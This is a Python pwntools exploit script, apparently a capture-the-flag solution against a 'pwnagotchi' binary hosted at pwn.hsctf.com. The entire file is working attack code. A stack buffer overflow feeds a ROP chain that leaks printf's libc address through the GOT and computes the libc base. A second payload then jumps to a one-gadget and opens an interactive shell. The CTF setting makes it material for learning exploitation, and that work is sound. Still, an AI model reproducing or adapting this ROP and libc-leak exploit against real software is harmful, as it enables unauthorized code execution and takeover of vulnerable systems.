from pwn import *

file = "./pwnagotchi"

context.binary = file
context.log_level = 'debug'

bin = ELF(file)
#r = process(file)
#raw_input()
r = remote("pwn.hsctf.com", 5005)

printfGOT = bin.got["printf"]
printfAddr = bin.symbols["printf"]
eatAddr = bin.symbols["eat"]
zzzAddr = bin.symbols["zzz"]
mainAddr = bin.symbols["main"]

payload = "A" * 20 # fill up the stack to ret addr
payload += pack(0x0000000000400285) # ret since the stack must be aligned
payload += pack(0x00000000004009f3) # pop next val into rdi (param1)
payload += pack(printfGOT) # printf got entry
payload += pack(printfAddr) # call printf to leak libc addr
payload += pack(zzzAddr) # call zzz
payload += pack(eatAddr) # call eat
payload += pack(0x00400700) # jump to main

r.sendlineafter("Enter your pwnagotchi's name:", payload)
r.recvuntil("!\n")

printfLeakAddr = unpack(r.recv(6) + "\x00\x00")
libcBaseAddr = printfLeakAddr - 0x64e80
gadgetAddr = libcBaseAddr + 0x4f322

payload = "A" * 20 # fill up the stack to ret addr
payload += pack(0x0000000000400285) # ret since the stack must be aligned
payload += pack(gadgetAddr) # one gadget
payload += "\x00" * 0x100 # fill up the stack in order to satisfy the gadget requirements

r.sendlineafter("Enter your pwnagotchi's name:", payload)
r.interactive()